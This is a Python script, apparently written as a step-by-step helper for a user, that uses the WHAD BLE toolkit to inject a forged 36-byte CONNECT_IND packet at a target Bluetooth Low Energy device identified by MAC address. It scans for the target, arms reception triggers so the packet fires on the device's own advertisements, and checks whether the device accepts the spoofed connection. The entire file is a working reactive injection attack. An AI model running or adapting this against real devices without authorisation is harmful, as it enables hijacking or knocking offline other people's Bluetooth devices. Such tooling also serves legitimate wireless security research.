#!/usr/bin/env python3
import argparse, time, threading, sys

def _parse_args():
    p = argparse.ArgumentParser(description="Continuous-scan reactive CONNECT_IND injection (low-latency arming).")
    p.add_argument("mac", nargs="?", default="C0:00:00:41:73:AC", help="target MAC (default: %(default)s)")
    p.add_argument("--scan-time", type=int, default=30, help="scan window seconds (default: %(default)s)")
    p.add_argument("--window", type=int, default=90, help="watch window seconds (default: %(default)s)")
    p.add_argument("--port", default="uart0", help="WHAD dongle port (default: %(default)s)")
    return p.parse_args()

ARGS = _parse_args()

TARGET      = ARGS.mac
TARGET_KEY  = TARGET.replace(":", "").upper()
ADVA_WIRE   = bytes.fromhex(TARGET_KEY)[::-1]
PDU_HEX     = "8522AABBCCDDEEFFAC73410000C0A1B2C3D412345602000018000000C800FFFFFFFF1F2D"
RAW         = bytes.fromhex(PDU_HEX)
SCAN_TIME, WINDOW = ARGS.scan_time, ARGS.window

from whad.device import WhadDevice
from whad.ble.connector import Injector
from whad.common.triggers import ReceptionTrigger
from scapy.layers.bluetooth4LE import BTLE, BTLE_ADV_IND

dev = WhadDevice.create(ARGS.port)
inj = Injector(dev)

FOUND, FIRED = threading.Event(), threading.Event()
count = {"adv": 0}

_orig_hook = inj.on_adv_pdu
def _on_adv_pdu(pkt, *a, **k):
    try:
        if ADVA_WIRE in bytes(pkt):
            count["adv"] += 1
            FOUND.set()
    except Exception: pass
    try: return _orig_hook(pkt, *a, **k)
    except Exception: pass
inj.on_adv_pdu = _on_adv_pdu

print("="*62)
print(" SCAN -> CONFIRM -> INJECT  (your literal 36-byte CONNECT_IND)")
print("="*62)

# ---------- PHASE 1: SCAN ----------
print(f"\n[PHASE 1] scanning for {TARGET} (up to {SCAN_TIME}s) ...")
for name, fn in (("enable_scan_mode", lambda: inj.enable_scan_mode()),
                 ("enable_scan_mode(active=False)", lambda: inj.enable_scan_mode(active=False)),
                 ("sniff_advertisements", lambda: inj.sniff_advertisements()),
                 ("sniff_advertisements(active=False)", lambda: inj.sniff_advertisements(active=False))):
    try:
        fn(); print(f"[i] RX mode via {name}()"); break
    except Exception as e:
        print(f"[-] {name}: {type(e).__name__}: {e}")
else:
    print("[X] cannot enter RX mode"); sys.exit(1)
try: inj.start()
except Exception as e: print(f"[i] start(): {type(e).__name__}: {e} (continuing)")

t0 = time.time()
while time.time() - t0 < SCAN_TIME and not FOUND.is_set():
    time.sleep(0.3)
if not FOUND.is_set():
    print(f"[X] NOT FOUND -> device not advertising. Pairing mode / disconnect phone, re-run.")
    sys.exit(1)
print(f"[OK] DEVICE IS THERE: {TARGET}  (its ADV packets are being received)")

# ---------- PHASE 2: ARM ----------
PKT = BTLE(bytes.fromhex("D6BE898E") + RAW)
assert bytes(PKT)[4:] == RAW, "round-trip mismatch"
print("\n[PHASE 2] arming triggers (scan mode STAYS ON - radio must keep listening)")
armed = []
for nm, mk in (("AdvA@off2", lambda: ReceptionTrigger(pattern=ADVA_WIRE, mask=b"\xff"*6, offset=2)),
               ("AdvA@off0", lambda: ReceptionTrigger(pattern=ADVA_WIRE, mask=b"\xff"*6, offset=0)),
               ("AdvA@off6", lambda: ReceptionTrigger(pattern=ADVA_WIRE, mask=b"\xff"*6, offset=6)),
               ("autoADV",   lambda: ReceptionTrigger(packet=BTLE_ADV_IND(AdvA=TARGET)))):
    try:
        trig = mk(); inj.prepare(PKT, trigger=trig); inj.trigger(trig)
        armed.append((nm, trig)); print(f"[+] ARMED  {nm}")
    except Exception as e:
        print(f"[-] {nm}: {type(e).__name__}: {e}")
if not armed:
    print("[X] nothing armed"); sys.exit(1)

def _hook(trig, nm):
    orig = getattr(trig, "trigger", None)
    def hooked(*a, **k):
        if not FIRED.is_set():
            print("\n>>> [ FIRE ] TRIGGER FIRED -> YOUR 36 BYTES WERE TRANSMITTED ON-AIR <<<\n", flush=True)
        FIRED.set()
        try: return orig(*a, **k) if callable(orig) else None
        except Exception: return None
    trig.trigger = hooked
for nm, trig in armed: _hook(trig, nm)
_orig_trig = inj.on_triggered
def _on_triggered(*a, **k):
    if not FIRED.is_set():
        print("\n>>> [ FIRE ] TRIGGER FIRED -> YOUR 36 BYTES WERE TRANSMITTED ON-AIR <<<\n", flush=True)
    FIRED.set()
    try: return _orig_trig(*a, **k)
    except Exception: pass
inj.on_triggered = _on_triggered

# ---------- PHASE 3: WATCH ----------
print(f"\n[PHASE 3] watching {WINDOW}s - trigger fires on the device's own ADV_IND")
print("[i] ALSO watch 'MDT2410161' on your PHONE (nRF Connect): VANISH = it accepted YOUR packet")
try:
    t0 = time.time()
    while time.time() - t0 < WINDOW:
        left = int(WINDOW - (time.time() - t0))
        print(f"  [{left:>3}s] ADVs from target: {count['adv']:>4}  |  {'FIRED - packet sent' if FIRED.is_set() else 'armed, waiting'}", flush=True)
        time.sleep(10)
except KeyboardInterrupt: pass

print("\n" + "="*62)
if FIRED.is_set():
    print("RESULT: PACKET WAS SENT (pattern matched + firmware transmitted).")
    print("Phone: MDT2410161 vanished = ACCEPTED. Reappeared = expected timeout cycle.")
elif count["adv"] > 0:
    print(f"RESULT: NOT SENT. Device WAS advertising ({count['adv']} ADVs) but no trigger matched -> send me 'cat inject_api.txt'")
else:
    print("RESULT: NOT SENT. Device never advertised in the window (phone grabbed it / slept).")
print("="*62)
